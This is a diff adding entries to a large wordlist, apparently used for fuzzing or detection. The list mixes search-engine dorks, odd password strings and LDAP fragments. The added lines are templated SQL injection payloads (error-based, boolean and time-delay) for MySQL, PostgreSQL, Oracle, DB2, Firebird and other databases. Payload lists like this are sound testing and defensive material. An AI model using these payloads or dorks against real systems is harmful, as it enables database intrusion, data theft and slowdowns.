@@ -146,6 +146,7 @@ $@!(!^&
 ("port_255/home")|(inurl:"home?port=255?)
 ("skin design by amie of intense")|("fanfiction categories" "featured stories")|("default2, 3column, romance, efiction")
 (#**&)(*)@#
+('[delimiter_start]'||(case when ([randnum]=[randnum]) then '1' else '0' end)||'[delimiter_stop]')
 (*)(*)
 (*)*)
 (*)admin#%#^
@@ -166,6 +167,8 @@ $@!(!^&
 (@@)9(**)ff
 (anna17*)
 (cam1java)|(cam2java)|(cam3java)|(cam4java)|(cam5java)|(cam6java) -navy.mil -backflip -power.ne.jp
+(cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]' as numeric))
+(cast('[delimiter_start]'||(select 1 from generate_series([randnum],[randnum],case when ([randnum]=[randnum]) then 1 else 0 end) limit 1)::text||'[delimiter_stop]' as numeric))
 (d=*)*
 (d=*,*)*
 (intitle:"502 proxy error")|(intitle:"503 proxy error") "the proxy server could not handle the request" -topic -mail -4suite -list -site:geocrawler.co
@@ -183,6 +186,19 @@ $@!(!^&
 (l=*)
 (pinky99*)
 (sanju802*)
+(select '[delimiter_start]'||(case when ([randnum]=[randnum]) then to_number(1) else to_number(0) end)||'[delimiter_stop]' from dual)
+(select '[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]')
+(select (case when ([randnum]=[randnum]) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else [randnum] end) from dual)
+(select (case when ([randnum]=[randnum]) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else [randnum] end))
+(select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
+(select [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then 1 else 0 end from rdb$database)||'[delimiter_stop]'))
+(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+(select count(*) from generate_series(1,[sleeptime]000000))
+(select count(*) from information_schema.columns a, information_schema.columns b, information_schema.columns c where 0 xor 1)
+(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)
+(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
+(select count(*) from sysmaster:syspaghdr)
+(select upper(xmltype(chr(60)||chr(58)||'[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'||chr(62))) from dual)
 (username=* | username:* |) | ( ((password=* | password:*) | (passwd=* | passwd:*) | (credentials=* | credentials:*)) | ((hash=* | hash:*) | (md5:* | md5=*)) | (inurl:auth | inurl:passwd | inurl:pass) ) filetype:log
 (wo201314*)
 (x(1)s(*))/
@@ -234,12 +250,22 @@ $@!(!^&
 **)*&)(*
 **)7dkng63zk3v
 *{background:url(xx:x //**/\red/*)} /* ie 6-7 standards mode */
+,(cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]' as numeric))
+,(cast('[delimiter_start]'||(select 1 from generate_series([randnum],[randnum],case when ([randnum]=[randnum]) then 1 else 0 end) limit 1)::text||'[delimiter_stop]' as numeric))
+,(select (case when ([randnum]=[randnum]) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual)
+,(select (case when ([randnum]=[randnum]) then (select count(*) from generate_series(1,[sleeptime]000000)) else 1/(select 0) end))
+,(select (case when ([randnum]=[randnum]) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else [randnum]*(select [randnum] union all select [randnum1]) end))
+,(select [randnum] from (select row([randnum],[randnum1])>(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from (select [randnum2] union select [randnum3] union select [randnum4] union select [randnum5])a group by x))s)
+,(select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
+,(select [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then 1 else 0 end from rdb$database)||'[delimiter_stop]'))
 ,(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))#
 ,(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
 ,(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+,(select upper(xmltype(chr(60)||chr(58)||'[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'||chr(62))) from dual)
 ,(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))%23
 ,(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
 ,(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+,raise_error('70001','[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from sysibm.sysdummy1)||'[delimiter_stop]')
 -l`p/xu`tg<5uzv}(|niuld
 -v`h~aqgfjuuz`\\!(,~h~.wmvbo@-@
 .d*)c@rnu\\c`\\alvnlv,vg#i\{)dgds
@@ -433,7 +459,27 @@ am#@!(*(
 amer!(*#
 an+wou=2
 and (select 4523 from(select count(*),concat(0x716a7a6a71,(select (elt(4523=4523,1))),0x71706a6b71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)
+and (select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
 and 3516=cast((chr(113)||chr(106)||chr(122)||chr(106)||chr(113))||(select (case when (3516=3516) then 1 else 0 end))::text||(chr(113)||chr(112)||chr(106)||chr(107)||chr(113)) as numeric)
+and [randnum]=('[delimiter_start]'||(case when ([randnum]=[randnum]) then '1' else '0' end)||'[delimiter_stop]')
+and [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then 1 else 0 end from rdb$database)||'[delimiter_stop]')
+and [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then code(49) else code(48) end)||'[delimiter_stop]')
+and [randnum]=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
+and [randnum]=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+and [randnum]=(select count(*) from generate_series(1,[sleeptime]000000))
+and [randnum]=(select count(*) from information_schema.columns a, information_schema.columns b, information_schema.columns c where 0 xor 1)
+and [randnum]=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)
+and [randnum]=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
+and [randnum]=(select count(*) from sysmaster:syspaghdr)
+and [randnum]=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)
+and [randnum]=(select upper(xmltype(chr(60)||chr(58)||'[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'||chr(62))) from dual)
+and [randnum]=cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]' as numeric)
+and [randnum]=cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then bitcount(bitstring_to_binary('1')) else bitcount(bitstring_to_binary('0')) end))::varchar||'[delimiter_stop]' as numeric)
+and [randnum]=ctxsys.drithsx.sn([randnum],('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'))
+and [randnum]=dbms_utility.sqlid_to_sqlhash(('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'))
+and [randnum]=raise_error('70001','[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from sysibm.sysdummy1)||'[delimiter_stop]')
+and [randnum]=utl_inaddr.get_host_address('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]')
+and row([randnum],[randnum1])>(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from (select [randnum2] union select [randnum3] union select [randnum4] union select [randnum5])a group by x)
 ander!(
 anilram)()(!(&(
 anilram)()(!(&(t4yad!h*7#7!@-+)(ma4ritzx4!!
@@ -1150,6 +1196,26 @@ o(i*)+|
 o(i*)p(o
 opera/9.80 (windows nt 6.1; wow64; wuid=2bbf8ef8d0fa60af6177cad42ac3a75b; wtb=6787) presto/2.12.388 version/12.12
 opherenou=
+or (select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
+or [randnum]=('[delimiter_start]'||(case when ([randnum]=[randnum]) then '1' else '0' end)||'[delimiter_stop]')
+or [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then 1 else 0 end from rdb$database)||'[delimiter_stop]')
+or [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then code(49) else code(48) end)||'[delimiter_stop]')
+or [randnum]=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
+or [randnum]=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+or [randnum]=(select count(*) from generate_series(1,[sleeptime]000000))
+or [randnum]=(select count(*) from information_schema.columns a, information_schema.columns b, information_schema.columns c where 0 xor 1)
+or [randnum]=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)
+or [randnum]=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
+or [randnum]=(select count(*) from sysmaster:syspaghdr)
+or [randnum]=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)
+or [randnum]=(select upper(xmltype(chr(60)||chr(58)||'[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'||chr(62))) from dual)
+or [randnum]=cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]' as numeric)
+or [randnum]=cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then bitcount(bitstring_to_binary('1')) else bitcount(bitstring_to_binary('0')) end))::varchar||'[delimiter_stop]' as numeric)
+or [randnum]=ctxsys.drithsx.sn([randnum],('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'))
+or [randnum]=dbms_utility.sqlid_to_sqlhash(('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'))
+or [randnum]=raise_error('70001','[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from sysibm.sysdummy1)||'[delimiter_stop]')
+or [randnum]=utl_inaddr.get_host_address('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]')
+or row([randnum],[randnum1])>(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from (select [randnum2] union select [randnum3] union select [randnum4] union select [randnum5])a group by x)
 oyc!(820906
 p089p)*)
 p4p*))
@@ -1168,6 +1234,7 @@ qqq520!(*!<)q!
 qr|(;
 qscgu*)
 rah)!((!
+raise_error('70001','[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from sysibm.sysdummy1)||'[delimiter_stop]')
 raja@!$!(*(
 raws9+*)
 rd!(*%
@@ -1202,6 +1269,8 @@ santh@!(&
 sarah!(^)
 scdc=1
 se919de(***)
+select '[delimiter_start]'||(case [randnum] when [randnum] then 1 else 0 end)||'[delimiter_stop]' from rdb$database
+select '[delimiter_start]'||(case when ([randnum]=[randnum]) then 1 else 0 end)||'[delimiter_stop]'
 service/profile/?uid=
 sghlkjn(*)
 shiyun!(*#
